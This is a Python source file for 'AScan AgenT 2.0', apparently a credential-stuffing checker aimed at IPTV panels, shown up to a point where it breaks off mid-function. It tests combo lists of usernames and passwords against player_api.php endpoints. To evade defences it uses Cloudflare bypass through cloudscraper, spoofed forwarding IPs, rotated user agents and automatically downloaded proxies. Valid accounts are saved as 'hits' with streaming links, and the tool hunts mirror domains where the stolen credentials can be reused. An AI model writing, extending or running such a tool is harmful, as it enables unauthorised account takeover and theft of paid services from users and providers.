# -*- coding: utf-8 -*-
"""
AScan AgenT 2.0
"""

import os
import sys
import time
import datetime
import threading
import queue
import random
import re
import socket
import json
import subprocess
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== IMPORTS COM FALLBACK ==========
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ========== BIBLIOTECAS DO RAPTOR ==========
try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "cloudscraper"])
        import cloudscraper
        CLOUDSCRAPER_AVAILABLE = True
    except:
        CLOUDSCRAPER_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "dnspython"])
        import dns.resolver
        DNS_AVAILABLE = True
    except:
        DNS_AVAILABLE = False

# ========== DIRETÓRIOS ==========
BASE_DIR = '/sdcard'
OUT_DIR = os.path.join(BASE_DIR, 'AScan_AgenT')
COMBO_DIR = os.path.join(BASE_DIR, 'combo')
HITS_DIR = os.path.join(OUT_DIR, 'HITS')
COMBO_HITS_DIR = os.path.join(OUT_DIR, 'COMBO')
ALARM_DIR = os.path.join(OUT_DIR, 'Alarm')
PROXY_DIR = os.path.join(OUT_DIR, 'proxys')
SESSIONS_DIR = os.path.join(OUT_DIR, 'Sessoes')

for d in [OUT_DIR, COMBO_DIR, HITS_DIR, COMBO_HITS_DIR, ALARM_DIR, PROXY_DIR, SESSIONS_DIR]:
    try:
        os.makedirs(d, exist_ok=True)
    except:
        pass

HIT_SOUND_PATH = os.path.join(ALARM_DIR, "hit_sound.mp3")

# ========== CORES AScan ==========
C = {
    'reset': '\033[0m',
    'bold': '\033[1m',
    'dim': '\033[2m',
    'vermelho': '\033[38;5;88m',
    'vermelho_claro': '\033[38;5;196m',
    'azul': '\033[38;5;74m',
    'azul_claro': '\033[38;5;117m',
    'azul_escuro': '\033[38;5;24m',
    'amarelo': '\033[38;5;214m',
    'amarelo_claro': '\033[38;5;226m',
    'marrom': '\033[38;5;130m',
    'marrom_escuro': '\033[38;5;52m',
    'branco': '\033[38;5;255m',
    'verde': '\033[38;5;46m',
    'verde_claro': '\033[38;5;82m',
    'verde_escuro': '\033[38;5;28m',
    'cinza': '\033[38;5;245m',
    'cinza_claro': '\033[38;5;250m',
    'rosa': '\033[38;5;198m',
    'rosa_claro': '\033[38;5;207m',
    'ciano': '\033[38;5;51m',
    'ciano_claro': '\033[38;5;87m',
    'magenta': '\033[38;5;201m',
    'ouro': '\033[38;5;220m',
    'laranja': '\033[38;5;214m',
    'roxo': '\033[38;5;129m',
}

LUZ_CORES = [
    C['ciano_claro'],
    C['verde_claro'],
    C['amarelo_claro'],
    C['rosa_claro'],
    C['azul_claro'],
    C['ouro'],
]

TEMPLATE_CORES = {
    'borda': C['azul'],
    'titulo': C['ouro'],
    'label': C['ciano_claro'],
    'valor': C['branco'],
    'destaque': C['verde_claro'],
    'separador': C['cinza'],
    'dns': C['ciano'],
    'status_online': C['verde_claro'],
    'status_offline': C['vermelho_claro'],
    'ilimitado': C['amarelo_claro'],
    'premium': C['roxo'],
}

# ========== ESTADOS GLOBAIS ==========
_pause_scan = threading.Event()
_stop_early = threading.Event()
_stop_parallel = threading.Event()
_stop_combos_by_index = {}
_stop_after_parallel = threading.Event()
SERVER_INDEX = {}

_global_parallel_count = 0
_global_parallels_seen = set()
_display_lock = threading.Lock()
_RESULTS_LOCK = threading.Lock()
_FILE_LOCK = threading.Lock()

HITS_BY_ID = {}
HITS_BY_SERVER = defaultdict(list)
BASELINE_CATS = {}
PARALLEL_SCANS = {}
HIT_CASCADE = deque(maxlen=5)

_SERVER_HTTP_STATUS = {}
_SERVER_HTTP_STATUS_LOCK = threading.Lock()
_SERVER_STATUS_WATCHERS = {}

_start_time = time.time()
_last_hit_message = ""
COMBO_ATUAL_NOME = ""
STATS_GERAIS = {"hits": 0, "hits_ilimitados": 0, "checks": 0, "start_time": 0}

_SPIN = ['|', '/', '-', '\\']
_spin_index = 0
_luz_index = 0

MODO_ATAQUE = "adaptativo"
MODO_ATAQUE_PARAMS = {
    'min_burst': 3,
    'max_burst': 8,
    'min_sleep': 1,
    'max_sleep': 3
}
STEALTH_ACTIVE = threading.Event()
PROXY_ROTATION = False

SESSION_CACHE = {}
SESSION_CACHE_LOCK = threading.Lock()
DNS_CACHE = {}
DNS_CACHE_LOCK = threading.Lock()
SESSIONS_SAVED = {}

# ========== SISTEMA DE HIT ALARM ==========
def hit_alarm():
    try:
        try:
            import androidhelper
            ad = androidhelper.Android()
            ad.vibrate(100)
        except:
            pass

        if os.path.exists(HIT_SOUND_PATH):
            try:
                os.system(f'timeout 2 mpv --no-video --really-quiet {HIT_SOUND_PATH} > /dev/null 2>&1 &')
            except:
                pass

        try:
            sys.stdout.write('\a')
            sys.stdout.flush()
        except:
            pass
    except:
        pass

# ========== USER-AGENTS AVANCADOS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "TiviMate/4.7.0 (Android 11; NVIDIA SHIELD TV Pro)",
    "IPTVSmartersPro/3.1.5 (Linux; Android 9) ExoPlayerLib/2.11.8",
    "VLC/3.0.18 LibVLC/3.0.18",
    "okhttp/5.2.0",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 WebAppManager",
    "Mozilla/5.0 (PlayStation 5; 6.50) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9", "es-ES,es;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8"]
REFERERS = [
    "http://www.google.com/", "http://www.bing.com/", "http://duckduckgo.com/",
    "https://www.youtube.com/", "https://www.facebook.com/", "https://twitter.com/",
    "https://www.reddit.com/", "https://www.amazon.com/", "https://www.wikipedia.org/",
    ""
]

# ========== HEADERS AVANCADOS ==========
def get_headers_avancados(target_country=None):
    profile = random.choice(USER_AGENTS)
    is_browser = 'Chrome' in profile or 'Firefox' in profile or 'Safari' in profile

    headers = {
        "User-Agent": profile,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "DNT": random.choice(["1", "0"]),
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

    if is_browser:
        headers.update({
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Sec-Ch-Ua": f'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Viewport-Width": str(random.randint(800, 1920)),
            "Device-Memory": str(random.choice(["4", "8", "16"])),
            "RTT": str(random.randint(50, 200)),
            "Downlink": str(random.randint(5, 15)),
            "ECT": random.choice(["4g", "3g"]),
        })

    ip_fake = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers.update({
        "X-Forwarded-For": ip_fake,
        "X-Real-IP": ip_fake,
        "X-Originating-IP": ip_fake,
        "Client-IP": ip_fake,
    })

    if random.random() > 0.3:
        headers["Referer"] = random.choice(REFERERS)

    return headers

# ========== GERENCIADOR DE SESSAO ==========
def get_session_hibrida(server=None, proxy=None, use_cloudscraper=True):
    session_key = f"{server}_{proxy}_{use_cloudscraper}"

    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            session, timestamp = SESSION_CACHE[session_key]
            if time.time() - timestamp < 300:
                return session

    session = None

    if use_cloudscraper and CLOUDSCRAPER_AVAILABLE:
        try:
            scraper = cloudscraper.create_scraper(
                browser='chrome',
                delay=random.uniform(0.5, 1.5),
                allow_brotli=True,
                debug=False
            )
            test_url = f"http://{server}/" if server else "https://www.google.com"
            scraper.get(test_url, timeout=5, verify=False)
            session = scraper
        except:
            session = None

    if session is None:
        session = requests.Session()
        session.headers.update(get_headers_avancados())
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

    with SESSION_CACHE_LOCK:
        SESSION_CACHE[session_key] = (session, time.time())

    return session

def renew_session_hibrida(server=None, proxy=None):
    session_key = f"{server}_{proxy}_True"
    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            del SESSION_CACHE[session_key]
    return get_session_hibrida(server, proxy)

# ========== DNS COM FALLBACK ==========
def resolve_dns_hibrido(host):
    with DNS_CACHE_LOCK:
        if host in DNS_CACHE:
            entry = DNS_CACHE[host]
            if time.time() - entry['timestamp'] < 1800:
                return entry['ip']

    ip = None

    if DNS_AVAILABLE:
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2
            resolver.lifetime = 2
            answers = resolver.resolve(host, 'A')
            for rdata in answers:
                ip = str(rdata)
                break
        except:
            pass

    if not ip:
        try:
            ip = socket.gethostbyname(host)
        except:
            pass

    if ip:
        with DNS_CACHE_LOCK:
            DNS_CACHE[host] = {'ip': ip, 'timestamp': time.time()}

    return ip

# ========== FETCH COM RETRY E BYPASS ==========
def fetch_json_hibrido(url, timeout=10, server=None, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            session = get_session_hibrida(server, proxy)

            headers = get_headers_avancados()
            if hasattr(session, 'headers'):
                session.headers.update(headers)

            if attempt > 0:
                time.sleep(random.uniform(1, 3) * attempt)

            r = session.get(url, timeout=timeout, verify=False, allow_redirects=True)

            if r.status_code == 200:
                try:
                    return r.json()
                except:
                    return None
            elif r.status_code in [403, 429, 520] and attempt < max_retries - 1:
                renew_session_hibrida(server, proxy)
                time.sleep(random.uniform(2, 5))
                continue
            elif r.status_code in [301, 302, 307]:
                try:
                    new_url = r.headers.get('Location')
                    if new_url:
                        if not new_url.startswith('http'):
                            new_url = url.split('/player_api')[0] + new_url
                        return fetch_json_hibrido(new_url, timeout, server, proxy, 1)
                except:
                    pass
            return None

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(random.uniform(1, 2))
                continue
            return None

    return None

# ========== SIMPLE STATUS COM BYPASS ==========
def simple_status_hibrido(url, timeout=4):
    try:
        session = get_session_hibrida()
        r = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
        return r
    except:
        return None

# ========== DETECCAO DE PAIS ==========
def resolve_ip(host):
    return resolve_dns_hibrido(host) or ""

def geo_lookup(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp", timeout=8)
        if r.status_code == 200:
            j = r.json()
            if j.get("status") == "success":
                return {
                    "country": j.get("country", ""),
                    "countryCode": j.get("countryCode", ""),
                    "region": j.get("regionName", ""),
                    "city": j.get("city", ""),
                    "isp": j.get("isp", ""),
                }
    except:
        pass
    return {"country": "", "countryCode": "", "region": "", "city": "", "isp": ""}

def country_flag(cc):
    try:
        if not cc or len(cc) != 2:
            return ""
        return chr(0x1F1E6 + ord(cc[0].upper()) - ord('A')) + chr(0x1F1E6 + ord(cc[1].upper()) - ord('A'))
    except:
        return ""

def describe_geo(geo):
    try:
        parts = []
        if geo.get("city"): parts.append(geo["city"])
        if geo.get("region"): parts.append(geo["region"])
        if geo.get("country"): parts.append(geo["country"])
        flag = country_flag(geo.get("countryCode", ""))
        return ", ".join(parts) + " " + flag if parts else "Desconhecido"
    except:
        return "Desconhecido"

# ========== FUNCOES DE CATEGORIAS ==========
def _safe_text(b):
    if isinstance(b, str):
        return b
    try:
        return b.decode("utf-8", errors="ignore")
    except:
        return str(b)

def download_m3u_text(server, user, pwd, timeout=4):
    base = f"http://{server}"
    urls = [
        f"{base}/get.php?username={user}&password={pwd}&type=m3u",
        f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus",
    ]
    for url in urls:
        try:
            session = get_session_hibrida(server)
            r = session.get(url, timeout=timeout, verify=False)
            if r.status_code == 200 and r.content:
                txt = _safe_text(r.content)
                if "#EXTM3U" in txt or "#EXTINF" in txt:
                    return txt
        except:
            pass
    return None

def extract_categories_from_m3u(m3u_text):
    if not m3u_text:
        return []
    cats = []
    seen = set()
    for line in m3u_text.splitlines():
        if "#EXTINF" in line and 'group-title="' in line:
            try:
                cat = line.split('group-title="')[1].split('"')[0]
                if cat and cat not in seen:
                    seen.add(cat)
                    cats.append(cat)
            except:
                pass
    return cats

def get_categories(server, user, pwd, timeout=8):
    try:
        url = f"http://{server}/player_api.php?action=get_live_categories&username={user}&password={pwd}"
        data = fetch_json_hibrido(url, timeout=timeout, server=server)
        if isinstance(data, list) and data:
            return [str(c.get("category_name", "")).strip() for c in data if c.get("category_name")]
    except:
        pass

    try:
        url = f"http://{server}/player_api.php?action=get_live_streams&username={user}&password={pwd}"
        data = fetch_json_hibrido(url, timeout=timeout, server=server)
        if isinstance(data, list) and data:
            cats = []
            seen = set()
            for item in data:
                name = str(item.get("category_name", "")).strip()
                if name and name not in seen:
                    seen.add(name)
                    cats.append(name)
            if cats:
                return cats
    except:
        pass

    m3u = download_m3u_text(server, user, pwd, timeout=4)
    if m3u:
        return extract_categories_from_m3u(m3u)

    return []

def _norm_txt(s):
    try:
        return "".join(c.lower() for c in str(s) if c.isalnum())
    except:
        return ""

def _cats_to_set(names):
    return set(_norm_txt(n) for n in names if n)

def _cats_similar(base_set, cand_set):
    if not base_set or not cand_set:
        return False
    inter = len(base_set.intersection(cand_set))
    uni = len(base_set.union(cand_set))
    return (inter >= 3) or (inter >= 2 and (inter / uni) >= 0.55) if uni else False

# ========== STATUS HTTP WATCHER ==========
def background_status_refresher(server, interval=15):
    while not _stop_early.is_set():
        try:
            hostport = server.replace("http://", "").replace("https://", "").split("/", 1)[0]
            url = f"http://{hostport}/"
            resp = simple_status_hibrido(url, timeout=5)

            if resp is None:
                status = "OFFLINE"
            else:
                code = resp.status_code
                if 200 <= code < 300:
                    status = f"ONLINE {code}"
                elif code == 404:
                    status = "REDIRECT 404"
                elif 300 <= code < 400:
                    status = f"REDIRECT {code}"
                elif code in (401, 403, 429):
                    status = f"PROTECTED {code}"
                elif 400 <= code < 500:
                    status = f"CLIENT_ERROR {code}"
                elif 500 <= code < 600:
                    status = f"SERVER_ERROR {code}"
                else:
                    status = f"HTTP {code}"

            with _SERVER_HTTP_STATUS_LOCK:
                _SERVER_HTTP_STATUS[server] = status
        except:
            pass

        for _ in range(interval * 10):
            if _stop_early.is_set():
                break
            time.sleep(0.1)

# ========== DOMAIN PARALLEL SCAN ==========
def load_domains():
    domains_file = os.path.join(OUT_DIR, "domains.txt")
    if not os.path.exists(domains_file):
        return []
    try:
        with open(domains_file, "r", encoding="utf-8") as f:
            return [d.strip() for d in f if d.strip() and not d.startswith("#")]
    except:
        return []

class ScanState:
    def __init__(self, key):
        self.key = key
        self.results = []
        self.live = []
        self.total = 0
        self.done = 0
        self.started = threading.Event()
        self.finished = threading.Event()
        self.task_q = None

def run_parallel_domains(server_key, user, pwd, port):
    state = PARALLEL_SCANS.setdefault(server_key, ScanState(server_key))
    if state.started.is_set():
        return
    state.started.set()

    domains = load_domains()
    state.total = len(domains)
    if not domains:
        state.finished.set()
        return

    task_q = queue.Queue()
    for d in domains:
        task_q.put(d)
    state.task_q = task_q

    def worker():
        while not _stop_early.is_set() and not _stop_parallel.is_set():
            try:
                dom = task_q.get(timeout=0.5)
            except queue.Empty:
                break

            try:
                srv = f"{dom}:{port}"
                url = f"http://{srv}/player_api.php?username={user}&password={pwd}"
                data = fetch_json_hibrido(url, timeout=4, server=srv)

                ok = data and str(data.get("user_info", {}).get("status", "")).lower() in ["active", "1", "true", "ok"]
                if ok:
                    base_set = BASELINE_CATS.get(server_key, set())
                    cand_names = get_categories(srv, user, pwd, timeout=3)
                    cand_set = _cats_to_set(cand_names)

                    if _cats_similar(base_set, cand_set):
                        with _RESULTS_LOCK:
                            if dom not in state.results:
                                state.results.append(dom)
                                state.live.append(f"http://{srv}")
                                if len(state.live) > 3:
                                    state.live = state.live[-3:]
            except:
                pass
            finally:
                try:
                    task_q.task_done()
                except:
                    pass
                with _RESULTS_LOCK:
                    state.done += 1

        state.finished.set()

    for _ in range(10):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

# ========== CHECK TARGET COM BYPASS ==========
def check_target(server, item, timeout=8, proxy=None):
    user, pwd = item
    url = f'http://{server}/player_api.php?username={user}&password={pwd}'

    data = fetch_json_hibrido(url, timeout=timeout, server=server, proxy=proxy)
    if data:
        status = str(data.get('user_info', {}).get('status', '')).lower()
        if status in ['active', '1', 'true', 'ok']:
            return (True, data)

    try:
        m3u_url = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts'
        session = get_session_hibrida(server, proxy)
        r = session.get(m3u_url, timeout=timeout, verify=False)
        if r.status_code == 200 and r.content:
            txt = _safe_text(r.content)
            if "#EXTM3U" in txt or "#EXTINF" in txt:
                data = {"user_info": {"status": "active"}, "m3u_fallback": True}
                return (True, data)
    except:
        pass

    return (False, {})

def fetch_counts(server, user, pwd):
    try:
        base = f'http://{server}/player_api.php?username={user}&password={pwd}'
        canais = fetch_json_hibrido(base + '&action=get_live_streams', server=server) or []
        filmes = fetch_json_hibrido(base + '&action=get_vod_streams', server=server) or []
        series = fetch_json_hibrido(base + '&action=get_series', server=server) or []
        return (len(canais), len(filmes), len(series))
    except:
        return (0, 0, 0)

# ========== SALVAR HIT COM TEMPLATE AScan ==========
def remover_ansi(texto):
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', texto)

def build_hit_text(server, item, data):
    user, pwd = item
    ui = data.get('user_info', {})

    host = server.split(':')[0]
    port = server.split(':')[1] if ':' in server else '80'
    ip = resolve_ip(host)
    geo_data = geo_lookup(ip) if ip else {}
    geo_txt = describe_geo(geo_data)

    canais, filmes, series = fetch_counts(server, user, pwd)
    total = canais + filmes + series

    exp = ui.get('exp_date', '0')
    is_ilimitado = False
    dias_restantes = 0
    if exp in ['0', 'null', 'None', '']:
        is_ilimitado = True
    else:
        try:
            exp_ts = int(exp)
            dias_restantes = int((exp_ts - time.time()) / 86400)
            if dias_restantes > 365:
                is_ilimitado = True
        except:
            is_ilimitado = True

    created_at = ui.get('created_at', '0')
    created_str = "N/A"
    if created_at and created_at != '0':
        try:
            created_ts = int(created_at)
            created_str = datetime.datetime.fromtimestamp(created_ts).strftime('%d/%m/%Y')
        except:
            pass

    exp_str = "Ilimitado"
    if not is_ilimitado and exp not in ['0', 'null', 'None', '']:
        try:
            exp_ts = int(exp)
            exp_str = datetime.datetime.fromtimestamp(exp_ts).strftime('%d/%m/%Y')
        except:
            pass

    m3u = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts'
    epg = f'http://{host}/xmltv.php?username={user}&password={pwd}'

    cor_dns = TEMPLATE_CORES['dns']
    cor_status = TEMPLATE_CORES['status_online']
    cor_plano = TEMPLATE_CORES['ilimitado'] if is_ilimitado else TEMPLATE_CORES['premium']

    B = TEMPLATE_CORES['borda']
    T = TEMPLATE_CORES['titulo']
    L = TEMPLATE_CORES['label']
    V = TEMPLATE_CORES['valor']
    D = TEMPLATE_CORES['destaque']
    S = TEMPLATE_CORES['separador']
    R = C['reset']

    template = f"""{B}╭──{T} AScan AgenT 2.0 ─{B} [HIT]{R}
{L}| {V}Servidor  ->{R} http://{server}
{L}| {V}DNS Real  ->{R} {cor_dns}{host}{R}:{port}
{L}| {V}Local     ->{R} {geo_txt}
{S}  --------------------------{R}
{L}| {V}Usuario   ->{R} {user}
{L}| {V}Senha     ->{R} {pwd}
{L}| {V}Status    ->{R} {cor_status}[ONLINE]{R}
{L}| {V}Plano     ->{R} {cor_plano}{'ILIMITADO' if is_ilimitado else 'PREMIUM'}{R}
{L}| {V}Conexoes  ->{R} {ui.get('active_cons', '0')}/{ui.get('max_connections', '1')}
{L}| {V}Criado em ->{R} {created_str}
{L}| {V}Expira em ->{R} {exp_str}
{L}| {V}Restam    ->{R} {dias_restantes if not is_ilimitado else 'Ilimitado'} {'Dias' if not is_ilimitado else ''}
{L}| {V}Canais    ->{R} {canais}
{L}| {V}Filmes    ->{R} {filmes}
{L}| {V}Series    ->{R} {series}
{L}| {V}Total     ->{R} {total}
{S}  --------------------------{R}
{L}| {V}M3U       ->{R} {m3u}
{L}| {V}EPG       ->{R} {epg}
{L}| {V}Combo     ->{R} {COMBO_ATUAL_NOME}"""

    msg = ui.get('message', '')
    if not msg:
        msg = data.get('message', '')
    if msg:
        template += f"""
{L}| {V}MSG API   ->{R} {msg}"""

    template += f"""
{S}  --------------------------{R}
{B} Grupo    -> {L}AScan{R}
{B} Telegram -> {L}https://t.me/+UfgoBcTQpwBlMDMx{R}
{B}╰──────────────────────────{R}"""

    return template, is_ilimitado

def save_hit(server, texto, is_ilimitado=False):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            data_str = datetime.datetime.now().strftime('%d-%m')
            filename = f"{data_str}_{safe_host}.txt"

            texto_limpo = remover_ansi(texto)
            timestamp = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            texto_completo = f"[{timestamp}]\n{texto_limpo}\n"

            path = os.path.join(HITS_DIR, filename)
            with open(path, "a", encoding="utf-8") as f:
                f.write(texto_completo + "\n\n")

            geral_path = os.path.join(HITS_DIR, "HITS_GERAL.txt")
            with open(geral_path, "a", encoding="utf-8") as f:
                f.write(texto_completo + "\n\n")

            if is_ilimitado:
                ilimitado_path = os.path.join(HITS_DIR, "ILIMITADOS.txt")
                with open(ilimitado_path, "a", encoding="utf-8") as f:
                    f.write(texto_completo + "\n\n")

            global STATS_GERAIS
            STATS_GERAIS['hits'] += 1
            if is_ilimitado:
                STATS_GERAIS['hits_ilimitados'] += 1

            return True
    except Exception as e:
        return False

def save_combo_for_server(server, user, pwd):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            filename = f"{safe_host}.txt"
            path = os.path.join(COMBO_HITS_DIR, filename)
            with open(path, "a", encoding="utf-8") as f:
                f.write(f"{user}:{pwd}\n")
    except:
        pass

# ========== PROXY ==========
PROXY_SOURCES = {
    'http': [
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ],
    'socks4': [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    ],
    'socks5': [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    ]
}

def load_proxies(proxy_path):
    proxies = []
    if not proxy_path or not os.path.exists(proxy_path):
        return proxies
    try:
        with open(proxy_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    if "://" in line:
                        proxies.append(line)
                    else:
                        proxies.append(f"http://{line}")
    except:
        pass
    return proxies

def download_proxies_online(proxy_type='socks5'):
    urls = PROXY_SOURCES.get(proxy_type, [])
    proxies = set()

    for url in urls:
        try:
            r = requests.get(url, timeout=10, headers={'User-Agent': random.choice(USER_AGENTS)})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if ':' in line and '.' in line:
                        proxies.add(line)
        except:
            pass

    return list(proxies)

def choose_proxy_file():
    try:
        files = [f for f in os.listdir(PROXY_DIR) if os.path.isfile(os.path.join(PROXY_DIR, f))]
        if not files:
            print(f"\n{C['azul']} Baixando proxies automaticos...{C['reset']}")
            proxies = download_proxies_online('socks5')
            if proxies:
                proxy_file = os.path.join(PROXY_DIR, "proxies_auto.txt")
                with open(proxy_file, "w") as f:
                    f.write("\n".join(proxies))
                files = [os.path.basename(proxy_file)]

        if not files:
            return None, None

        print(f"\n{C['azul']} Arquivos proxy disponiveis:{C['reset']}")
        print(f"{C['amarelo']}0> Sem proxy{C['reset']}")
        for i, f in enumerate(files, 1):
            print(f"{C['amarelo']}{i}> {f}{C['reset']}")

        while True:
            try:
                choice = int(input(f"\n{C['ciano']}Escolha: {C['reset']}"))
                if choice == 0:
                    return None, None
                elif 1 <= choice <= len(files):
                    return os.path.join(PROXY_DIR, files[choice-1]), files[choice-1]
            except ValueError:
                print(f"{C['vermelho']}Digite um numero!{C['reset']}")
    except:
        return None, None

# ========== PAINEL COM ANIMACAO ==========
def render_panel(combo_name, stats, total_checks, server_hits):
    global _spin_index, _luz_index

    try:
        _spin_index += 1
        _luz_index += 1

        spin = _SPIN[_spin_index % len(_SPIN)]
        cor_spin = LUZ_CORES[_luz_index % len(LUZ_CORES)]

        progress = stats['checks'] / total_checks if total_checks else 0
        elapsed = int(time.time() - _start_time)
        tempo_str = f"{elapsed//60:02}:{elapsed%60:02}"
        cpm = stats.get('cpm', 0)

        ranked = sorted(server_hits.items(), key=lambda x: x[1], reverse=True)

        status_blocks = []
        with _SERVER_HTTP_STATUS_LOCK:
            local_status = dict(_SERVER_HTTP_STATUS)

        for srv in server_hits.keys():
            status = local_status.get(srv, "UNKNOWN")
            if "ONLINE" in status or "200" in status:
                col = C['verde']
            elif "REDIRECT" in status:
                col = C['amarelo']
            elif "PROTECTED" in status:
                col = C['rosa']
            elif "OFFLINE" in status:
                col = C['vermelho']
            else:
                col = C['cinza']
            status_blocks.append(f"{col}[{status}]{C['reset']}")

        B = TEMPLATE_CORES['borda']
        T = TEMPLATE_CORES['titulo']
        L = TEMPLATE_CORES['label']
        V = TEMPLATE_CORES['valor']
        D = TEMPLATE_CORES['destaque']
        R = C['reset']

        titulo_luz = f"{cor_spin}AScan AgenT 2.0{R}"

        tela = f"""{B}{'='*55}
 {titulo_luz}{B} | {L}AScan{R}
{B}{'='*55}
{L}Combo:{R}{D} {combo_name}{R}  {L}Servidores:{R}{V} {len(server_hits)}{R}
{cor_spin}{spin}{R}  {L}Progresso:{R}{D} {progress*100:.1f}%{R}
{B}{'='*55}"""

        for i, (srv, status) in enumerate(zip(server_hits.keys(), status_blocks)):
            cor_linha = LUZ_CORES[i % len(LUZ_CORES)]
            tela += f"\n  {cor_linha}|{R} {status}"

        modo_display = MODO_ATAQUE.replace('_', ' ').title()
        tela += f"""
{L}Modo:{R}{C['roxo']} {modo_display}{R}"""

        tela += f"""
{L}Checks:{R}{D} {stats['checks']:,}{R}  {L}Hits:{R}{D} {stats['hits']}{R}
{L}Ilimitados:{R}{C['amarelo']} {STATS_GERAIS['hits_ilimitados']}{R}
{L}CPM:{R}{D} {int(cpm)}{R}  {L}Tempo:{R}{D} {tempo_str}{R}
{cor_spin}|{R}  {L}Status:{R}{cor_spin} {'ATIVO' if stats['checks'] > 0 else 'AGUARDANDO'}{R}
{B}{'='*55}{R}
"""

        if ranked:
            tela += f"\n{L} Ranking de Servidores:{R}\n"
            for i, (srv, hits) in enumerate(ranked[:5], 1):
                cor_rank = LUZ_CORES[i % len(LUZ_CORES)]
                tela += f"  {cor_rank}{i}.{R} {srv[:30]} {D}{hits}{R} hits\n"

        if HIT_CASCADE:
            tela += f"\n{L} Ultimos Hits:{R}\n"
            for hit in list(HIT_CASCADE)[-3:]:
                cor_hit = random.choice(LUZ_CORES)
                tela += f"  {cor_hit}>{R} {hit}\n"

        total_mirrors = 0
        for st in PARALLEL_SCANS.values():
            total_mirrors += len(st.results)

        if total_mirrors > 0:
            tela += f"\n{L} Dominios Paralelos:{R} {C['verde']}{total_mirrors}{R}\n"
            for st in list(PARALLEL_SCANS.values())[:3]:
                if st.results:
                    for dom in st.results[:2]:
